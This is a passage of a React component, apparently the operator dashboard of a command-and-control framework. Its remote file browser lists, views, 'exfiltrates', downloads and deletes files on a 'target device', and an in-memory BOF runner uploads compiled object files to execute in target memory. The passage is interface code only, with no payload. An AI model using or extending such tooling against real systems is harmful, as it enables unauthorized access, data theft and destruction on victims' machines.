                <div style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--color-text-dim)', marginBottom: 8, padding: '4px 8px', borderRadius: 4, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border-muted)' }}>
                  Location: <span style={{ color: 'var(--color-primary)', fontWeight: 600 }}>{getLatestLsResult().path}</span>
                </div>
              )}

              <div className="card scroll-area" style={{ flex: 1, minHeight: 0 }}>
                <table className="dash-table">
                  <thead>
                    <tr><th>Name</th><th>Size</th><th>Type</th><th style={{ textAlign: 'right', paddingRight: 16 }}>Actions</th></tr>
                  </thead>
                  <tbody>
                    {getLatestLsResult()?.files ? (
                      getLatestLsResult().files.filter(f => f.name?.toLowerCase().includes(fileSearchQuery.toLowerCase())).map((file, i) => {
                        const fullFilePath = joinPath(getLatestLsResult().path, file.name);
                        return (
                          <tr key={i} onClick={() => file.is_dir && handleQuickAction('ls', { path: fullFilePath })} style={{ cursor: file.is_dir ? 'pointer' : 'default' }}>
                            <td style={{ fontWeight: 600, color: file.is_dir ? 'var(--color-primary)' : 'var(--color-text)' }}>
                              {file.is_dir ? '📁 ' : '📄 '}{file.name}
                            </td>
                            <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{file.size || '—'}</td>
                            <td><span className="os-badge">{file.is_dir ? 'DIR' : 'FILE'}</span></td>
                            <td style={{ textAlign: 'right', paddingRight: 12 }}>
                              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 6 }}>
                                {file.is_dir ? (
                                  <button onClick={(e) => { e.stopPropagation(); handleQuickAction('ls', { path: fullFilePath }); }} className="btn btn-secondary" style={{ padding: '3px 8px', fontSize: 10 }}>
                                    Open
                                  </button>
                                ) : (
                                  <>
                                    <button onClick={(e) => { e.stopPropagation(); handleQuickAction('cat', { path: fullFilePath }); }} className="btn btn-secondary" style={{ padding: '3px 8px', fontSize: 10 }} title="View text content">
                                      View
                                    </button>
                                    <button onClick={(e) => { e.stopPropagation(); handleQuickAction('download', { path: fullFilePath }); }} className="btn btn-primary" style={{ padding: '3px 8px', fontSize: 10, display: 'flex', alignItems: 'center', gap: 4 }} title="Exfiltrate & Download file">
                                      <Download size={11} /> Download
                                    </button>
                                  </>
                                )}
                                <button onClick={(e) => { 
                                  e.stopPropagation(); 
                                  if (confirm(`Are you sure you want to delete '${file.name}' from the target device?`)) {
                                    handleQuickAction('rm', { path: fullFilePath }); 
                                  }
                                }} className="btn btn-danger" style={{ padding: '3px 8px', fontSize: 10, display: 'flex', alignItems: 'center', gap: 4 }} title="Delete item from target">
                                  <Trash2 size={11} /> Delete
                                </button>
                              </div>
                            </td>
                          </tr>
                        );
                      })
                    ) : (
                      <tr><td colSpan={4} style={{ textAlign: 'center', padding: 40, color: 'var(--color-text-dim)' }}>No file manifest loaded. Click Refresh Directory.</td></tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* ── BOF Runner Tab ── */}
          {activeTab === 'bof' && (
            <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyCenter: 'center', padding: 40 }}>
              <div style={{ maxWidth: 400, width: '100%', margin: '0 auto', textAlign: 'center', display: 'flex', flexDirection: 'column', gap: 16 }}>
                <div style={{ width: 48, height: 48, borderRadius: 12, background: 'rgba(59,130,246,0.1)', color: 'var(--color-primary)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto' }}>
                  <Zap size={24} />
                </div>
                <div>
                  <h3 style={{ fontSize: 16, fontWeight: 700, color: 'var(--color-text-header)', marginBottom: 4 }}>In-Memory BOF Runner</h3>
                  <p style={{ fontSize: 12, color: 'var(--color-text-muted)', lineHeight: 1.5 }}>Execute unmanaged C COFF object files directly in target memory.</p>
                </div>
                <input type="text" id="bof-entry" placeholder="Entry point (default: go)" className="input" />
                <button onClick={() => {
                  const input = document.createElement('input'); input.type = 'file'; input.accept = '.o';
                  input.onchange = async (e) => {
                    const file = e.target.files[0]; if (!file) return;
                    const reader = new FileReader();
                    reader.onload = async () => {
                      const base64Data = reader.result.split(',')[1];
                      const entryInput = document.getElementById('bof-entry');
                      const entry = (entryInput && entryInput.value) || 'go';
                      handleQuickAction('bof_run', { bof_data: base64Data, entry });
                      setActiveTab('console');
                    };
                    reader.readAsDataURL(file);
                  };
                  input.click();
                }} className="btn btn-primary" style={{ padding: '10px 16px' }}>
                  <Download size={14} /> Select & Execute .O File
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Floating Toast Notifications */}
      <div style={{ position: 'fixed', bottom: 20, right: 20, display: 'flex', flexDirection: 'column', gap: 8, zIndex: 99, pointerEvents: 'none' }}>
        {toasts.map(toast => (
          <div key={toast.id} style={{ pointerEvents: 'auto', padding: '10px 16px', borderRadius: 8, background: 'var(--color-surface)', border: '1px solid var(--color-border)', color: toast.type === 'success' ? 'var(--color-success)' : toast.type === 'error' ? 'var(--color-error)' : 'var(--color-text)', fontSize: 12, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 8, boxShadow: '0 4px 16px rgba(0,0,0,0.3)' }}>
            {toast.type === 'success' ? <CheckCircle2 size={14} /> : toast.type === 'error' ? <AlertCircle size={14} /> : <ActivityIcon size={14} />}
            <span>{toast.title}</span>
          </div>
        ))}
      </div>
    </div>
  );
};

export default AgentDetailPage;
